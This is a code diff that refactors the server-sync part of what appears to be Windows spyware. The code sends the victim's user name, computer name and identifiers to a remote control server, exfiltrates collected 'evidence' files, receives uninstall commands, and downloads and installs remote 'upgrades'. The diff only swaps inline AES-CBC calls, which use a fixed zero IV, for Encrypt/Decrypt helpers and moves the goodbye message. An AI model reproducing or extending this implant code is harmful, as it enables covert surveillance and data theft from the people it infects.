@@ -8,14 +8,13 @@
 #include "proto.h"
 #include "md5.h"
 #include "sha1.h"
-#include "aes_alg.h"
+#include "crypt.h"
 #include "base64.h"
 #include "win_http.h"
 #include "upgrade.h"
 #include "log_files.h"
 #include "main.h"
 
-extern HINTERNET hGlobalInternet; // TODO FIXME remove me.
 
 BYTE pServerKey[32];
 BYTE pConfKey[32];
@@ -27,8 +26,6 @@ BOOL SyncWithServer()
 	PBYTE pRandomData, pProtoMessage, pInstanceId, pCryptedBuffer;
 	ULONG uGonnaDie, uGonnaUpdate;
 	BYTE pHashBuffer[20];
-	BYTE pInitVector[16];
-	aes_context pAesContext;
 	BOOL bRetVal = TRUE;
 
 	uGonnaDie = uGonnaUpdate = 0;
@@ -36,8 +33,8 @@ BOOL SyncWithServer()
 	memcpy(pServerKey, CLIENT_KEY, 32);
 	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
 #ifdef _DEBUG_BINPATCH
-	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
-	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
+	MD5((PBYTE)CLIENT_KEY, 32, pServerKey);
+	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, pConfKey);
 #endif
 	
 	pRandomData = (PBYTE)malloc(16);
@@ -88,14 +85,12 @@ BOOL SyncWithServer()
 	pMessageBuffer[3] = 0x0; // FLAG: reserved
 
 	// encrypt
-	memset(pInitVector, 0x0, 16);
-	aes_set_key(&pAesContext, (PBYTE)pServerKey, 128);
-	aes_cbc_encrypt(&pAesContext, pInitVector, pProtoMessage, pProtoMessage, uCryptBufferLen);
-	
+	Encrypt(pProtoMessage, uCryptBufferLen, pServerKey, PAD_NOPAD);
+
 	// append random block
 	GenerateRandomData(pProtoMessage + uCryptBufferLen, uRandPoolLen);
 
-	//base64 everything
+	// base64 everything
 	PBYTE pBase64Message = (PBYTE)base64_encode(pProtoMessage, uMessageLen);
 
 	// send request
@@ -112,9 +107,7 @@ BOOL SyncWithServer()
 	free(pHttpResponseBufferB64);
 
 	// decrypt
-	memset(pInitVector, 0x0, 16);
-	aes_set_key(&pAesContext, (PBYTE)pConfKey, 128);
-	aes_cbc_decrypt(&pAesContext, pInitVector, pProtoResponse, pProtoResponse, uOut);
+	Decrypt(pProtoResponse, uOut, pConfKey);
 
 	// fill packet
 	PROTO_RESPONSE_AUTH pProtoResponseId;
@@ -156,12 +149,11 @@ BOOL SyncWithServer()
 #endif
 
 	// session key sha1(conf_key + ks + kd)
-	//PBYTE pSessionKey = (PBYTE)malloc(20);
 	pBuffer = (PBYTE)malloc(48); 
 	memcpy(pBuffer, pConfKey, 16);
 	memcpy(pBuffer + 16, pProtoResponseId.pRandomData, 16);
 	memcpy(pBuffer + 16 + 16, pRandomData, 16);
-	CalculateSHA1((PBYTE)pSessionKey, pBuffer, 48);
+	CalculateSHA1(pSessionKey, pBuffer, 48);
 	free(pBuffer);
 
 	if (pProtoResponseId.uProtoCommand != PROTO_OK && pProtoResponseId.uProtoCommand != PROTO_NO && pProtoResponseId.uProtoCommand != PROTO_UNINSTALL)
@@ -172,9 +164,6 @@ BOOL SyncWithServer()
 		OutputDebugString(pDebugString);
 		free(pDebugString);
 #endif
-		// send PROTO_BYE
-		//WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, (PBYTE)pSessionKey, &pCryptedBuffer));
-		//free(pCryptedBuffer);
 
 		bRetVal = FALSE;
 		goto bailout;
@@ -183,10 +172,6 @@ BOOL SyncWithServer()
 
 	if (pProtoResponseId.uProtoCommand == PROTO_NO)
 	{
-		// send PROTO_BYE
-		//WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, (PBYTE)pSessionKey, &pCryptedBuffer));
-		//free(pCryptedBuffer);
-
 		bRetVal = FALSE;
 		goto bailout;
 	}
@@ -225,7 +210,7 @@ BOOL SyncWithServer()
 	memcpy(pBuffer + sizeof(ULONG) + uUserLen + uComputerLen, pSourceIdPascal, uSourceLen);
 
 	// Send ID
-	WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_ID, pBuffer, uBuffLen, (PBYTE)pSessionKey, &pCryptedBuffer));
+	WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_ID, pBuffer, uBuffLen, pSessionKey, &pCryptedBuffer));
 	free(pCryptedBuffer);
 	free(pBuffer);	
 
@@ -233,10 +218,7 @@ BOOL SyncWithServer()
 	PBYTE pHttpResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
 
 	// decrypt it
-	memset(pInitVector, 0x0, 16);
-	aes_set_key(&pAesContext, (PBYTE)pSessionKey, 128);
-	aes_cbc_decrypt(&pAesContext, pInitVector, pHttpResponseBuffer, pHttpResponseBuffer, uResponseLen);
-
+	Decrypt(pHttpResponseBuffer, uResponseLen, pSessionKey);
 
 	PPROTO_RESPONSE_ID pResponseId = (PPROTO_RESPONSE_ID)pHttpResponseBuffer;
 #ifdef _DEBUG
@@ -271,13 +253,11 @@ BOOL SyncWithServer()
 				OutputDebugString(pDebugString);
 				free(pDebugString);
 #endif
-				WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_UPGRADE, NULL, 0, (PBYTE)pSessionKey, &pCryptedBuffer));
+				WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_UPGRADE, NULL, 0, pSessionKey, &pCryptedBuffer));
 				free(pCryptedBuffer);
 
 				PBYTE pHttpUpgradeBuffer = WinHTTPGetResponse(&uResponseLen); 
-				memset(pInitVector, 0x0, 16);
-				aes_set_key(&pAesContext, (PBYTE)pSessionKey, 128);
-				aes_cbc_decrypt(&pAesContext, pInitVector, pHttpUpgradeBuffer, pHttpUpgradeBuffer, uResponseLen);
+				Decrypt(pHttpUpgradeBuffer, uResponseLen, pSessionKey);
 
 				PPROTO_RESPONSE_UPGRADE pProtoUpgrade = (PPROTO_RESPONSE_UPGRADE)pHttpUpgradeBuffer;
 				PWCHAR pUpgradeName = (PWCHAR)malloc(pProtoUpgrade->uUpgradeNameLen);
@@ -300,14 +280,8 @@ BOOL SyncWithServer()
 				ULONG uFileLength = *(PULONG) (((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen);
 				PBYTE pFileBuffer = (PBYTE)(((PBYTE)&pProtoUpgrade->pUpgradeNameBuffer) + pProtoUpgrade->uUpgradeNameLen) + sizeof(ULONG);
 
-				// say hello to server
-				WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, (PBYTE)pSessionKey, &pCryptedBuffer)); // double bye, vedi sotto.
-				free(pCryptedBuffer);
-
 				// upgrade & exit
-				Upgrade(pUpgradePath, pFileBuffer, uFileLength);
-
-				// if reached, then we had problem upgrading :(
+				Upgrade(pUpgradePath, pFileBuffer, uFileLength); //FIXME do not exit.
 
 
 				free(pRandString);
@@ -319,12 +293,9 @@ BOOL SyncWithServer()
 	}
 	free(pHttpResponseBuffer);
 
-	// send evidences
+
 	ProcessEvidenceFiles();
 
-	// send BYE
-	WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, (PBYTE)pSessionKey, &pCryptedBuffer));
-	free(pCryptedBuffer);
 
 	if (uGonnaUpdate)
 	{
@@ -337,6 +308,14 @@ BOOL SyncWithServer()
 
 
 bailout:
+	// send BYE
+#ifdef _DEBUG
+	OutputDebugString(L"[*] Sending PROTO_BYE\n");
+#endif
+	WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_BYE, NULL, 0, pSessionKey, &pCryptedBuffer));
+	free(pCryptedBuffer);
+
+
 	free(pProtoMessage);
 	free(pInstanceId);
 	free(pRandomData);
@@ -346,9 +325,6 @@ bailout:
 
 VOID SendEvidence(PBYTE pEvidence, LARGE_INTEGER uEvidenceSize, PBYTE pSessionKey)
 {
-	aes_context pAesContext;
-	BYTE pInitVector[16];
-
 	// send PROTO_EVIDENCE_SIZE
 	PPROTO_COMMAND_EVIDENCES_SIZE pCmdEvidenceSize = (PPROTO_COMMAND_EVIDENCES_SIZE)malloc(sizeof(ULONG) + sizeof(ULONG64));
 	pCmdEvidenceSize->uEvidenceNum = 1;
@@ -364,9 +340,7 @@ VOID SendEvidence(PBYTE pEvidence, LARGE_INTEGER uEvidenceSize, PBYTE pSessionKe
 	PBYTE pHttpResponseBuffer = WinHTTPGetResponse(&uResponseLen); 
 
 	// decrypt it
-	memset(pInitVector, 0x0, 16);
-	aes_set_key(&pAesContext, pSessionKey, 128);
-	aes_cbc_decrypt(&pAesContext, pInitVector, pHttpResponseBuffer, pHttpResponseBuffer, uResponseLen);
+	Decrypt(pHttpResponseBuffer, uResponseLen, pSessionKey);
 
 	if(*pHttpResponseBuffer != 0x1)
 		MessageBox(NULL, L"DIO", L"DIO", 0);
@@ -398,8 +372,6 @@ ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEnc
 	ULONG uOut, uOutClear;
 	PBYTE pBuffer, pOutBuffer;
 	BYTE pSha1Digest[20];
-	BYTE pInitVector[16];
-	aes_context pAesContext;
 
 	uOutClear = sizeof(ULONG) + uMessageLen + 20;
 	uOut = uOutClear;
@@ -422,10 +394,7 @@ ULONG CommandHash(ULONG uProtoCmd, PBYTE pMessage, ULONG uMessageLen, PBYTE pEnc
 		memcpy(pOutBuffer + sizeof(ULONG), pMessage, uMessageLen);
 	memcpy(pOutBuffer + sizeof(ULONG) + uMessageLen, pSha1Digest, 20);
 
-	// encrypt
-	memset(pInitVector, 0x0, 16);
-	aes_set_key(&pAesContext, pEncryptionKey, 128);
-	aes_cbc_encrypt_pkcs5(&pAesContext, pInitVector, pOutBuffer, pOutBuffer, uOutClear);
+	Encrypt(pOutBuffer, uOutClear, pEncryptionKey, PAD_PKCS5);
 
 	*pOutBuff = pOutBuffer;
 	return uOut;
